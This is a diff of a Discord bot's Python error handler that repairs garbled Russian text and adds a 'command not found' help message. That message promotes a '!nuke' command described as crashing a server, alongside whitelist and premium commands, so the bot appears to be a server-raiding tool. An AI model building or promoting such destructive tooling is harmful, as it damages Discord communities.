-    """Р“Р»РѕР±Р°Р»СЊРЅС‹Р№ РѕР±СЂР°Р±РѕС‚С‡РёРє РѕС€РёР±РѕРє вЂ” РѕР±СЉСЏСЃРЅСЏРµС‚ С‡С‚Рѕ РїРѕС€Р»Рѕ РЅРµ С‚Р°Рє."""
-    # РРіРЅРѕСЂРёСЂСѓРµРј РµСЃР»Рё РєРѕРјР°РЅРґР° РЅРµ РЅР°Р№РґРµРЅР° (РЅРµ РЅР°С€Р° РєРѕРјР°РЅРґР°)
+    """Глобальный обработчик ошибок — объясняет что пошло не так."""
+    # Команда не найдена — показываем подсказку
     if isinstance(error, commands.CommandNotFound):
+        cmd_text = ctx.message.content.split()[0][1:]  # Убираем ! и берём первое слово
+        embed = discord.Embed(
+            title="? Команда не найдена",
+            description=(
+                f"Команда `!{cmd_text}` не существует.\n\n"
+                "**Возможно вы имели в виду:**\n"
+                "`!nuke` — краш сервера\n"
+                "`!help` — список всех команд\n"
+                "`!setup` — настройка сервера\n"
+                "`!list` — показать списки\n\n"
+                "**Нужна помощь?**\n"
+                "Напиши `!help` для полного списка команд\n"
+                "Или присоединись к нашему серверу: https://discord.gg/nNTB37QNCG"
+            ),
+            color=0xff0000
+        )
+        embed.set_footer(text="?? Kanero")
+        await ctx.send(embed=embed)
         return
 
-    # РќРµ С…РІР°С‚Р°РµС‚ Р°СЂРіСѓРјРµРЅС‚РѕРІ
+    # Не хватает аргументов
     if isinstance(error, commands.MissingRequiredArgument):
         cmd = ctx.command
         usage = f"`!{cmd.name}`"
         if cmd.name == "compensate":
-            usage = "`!compensate @user wl/pm/fl 2d`\nРџСЂРёРјРµСЂ: `!compensate @user pm 2d`"
+            usage = "`!compensate @user wl/pm/fl 2d`\nПример: `!compensate @user pm 2d`"
         elif cmd.name == "announce_bug":
-            usage = "`!announce_bug РќР°Р·РІР°РЅРёРµ | РћРїРёСЃР°РЅРёРµ`"
+            usage = "`!announce_bug Название | Описание`"
         elif cmd.name == "wl_add":
             usage = "`!wl_add @user`"
         elif cmd.name == "pm_add":
@@ -5839,37 +5857,37 @@ async def on_command_error(ctx, error):
         elif cmd.name == "fl_add":
             usage = "`!fl_add @user`"
         elif cmd.name == "giverole":
-            usage = "`!giverole @user @СЂРѕР»СЊ`"
+            usage = "`!giverole @user @роль`"
         elif cmd.name == "unban":
             usage = "`!unban <ID>`"
         else:
-            usage = f"`!{cmd.name}` вЂ” РЅРµ С…РІР°С‚Р°РµС‚ Р°СЂРіСѓРјРµРЅС‚Р° `{error.param.name}`"
-        await ctx.send(f"вќЊ **РќРµ С…РІР°С‚Р°РµС‚ Р°СЂРіСѓРјРµРЅС‚РѕРІ.**\nРџСЂР°РІРёР»СЊРЅРѕ: {usage}")
+            usage = f"`!{cmd.name}` — не хватает аргумента `{error.param.name}`"
+        await ctx.send(f"? **Не хватает аргументов.**\nПравильно: {usage}")
         return
 
-    # РќРµРІРµСЂРЅС‹Р№ С‚РёРї Р°СЂРіСѓРјРµРЅС‚Р°
+    # Неверный тип аргумента
     if isinstance(error, commands.BadArgument):
         cmd = ctx.command
         if cmd.name == "compensate":
             await ctx.send(
-                "вќЊ **РќРµРІРµСЂРЅС‹Р№ Р°СЂРіСѓРјРµРЅС‚.**\n"
-                "РџСЂР°РІРёР»СЊРЅРѕ: `!compensate @user wl/pm/fl 2d`\n"
-                "**РўРёРїС‹:** `wl` В· `pm` В· `fl`\n"
-                "**Р’СЂРµРјСЏ:** `2d` В· `48h` В· `24`"
+                "? **Неверный аргумент.**\n"
+                "Правильно: `!compensate @user wl/pm/fl 2d`\n"
+                "**Типы:** `wl` · `pm` · `fl`\n"
+                "**Время:** `2d` · `48h` · `24`"
             )
         else:
-            await ctx.send(f"вќЊ **РќРµРІРµСЂРЅС‹Р№ Р°СЂРіСѓРјРµРЅС‚.** РџСЂРѕРІРµСЂСЊ РїСЂР°РІРёР»СЊРЅРѕСЃС‚СЊ РєРѕРјР°РЅРґС‹: `!{cmd.name}`")
+            await ctx.send(f"? **Неверный аргумент.** Проверь правильность команды: `!{cmd.name}`")
         return
 
-    # РќРµС‚ РїСЂР°РІ
+    # Нет прав
     if isinstance(error, commands.CheckFailure):
-        return  # РњРѕР»С‡Р° РёРіРЅРѕСЂРёСЂСѓРµРј вЂ” РЅРµ РЅР°С€ РїРѕР»СЊР·РѕРІР°С‚РµР»СЊ
+        return  # Молча игнорируем — не наш пользователь
 
-    # РћСЃС‚Р°Р»СЊРЅС‹Рµ РѕС€РёР±РєРё вЂ” Р»РѕРіРёСЂСѓРµРј РЅРѕ РЅРµ СЃРїР°РјРёРј
+    # Остальные ошибки — логируем но не спамим
     if isinstance(error, commands.CommandInvokeError):
         original = error.original
         cmd_name = ctx.command.name if ctx.command else "?"
-        await ctx.send(f"вќЊ РћС€РёР±РєР° РїСЂРё РІС‹РїРѕР»РЅРµРЅРёРё `!{cmd_name}`: `{type(original).__name__}: {original}`")
+        await ctx.send(f"? Ошибка при выполнении `!{cmd_name}`: `{type(original).__name__}: {original}`")
         return
 
 
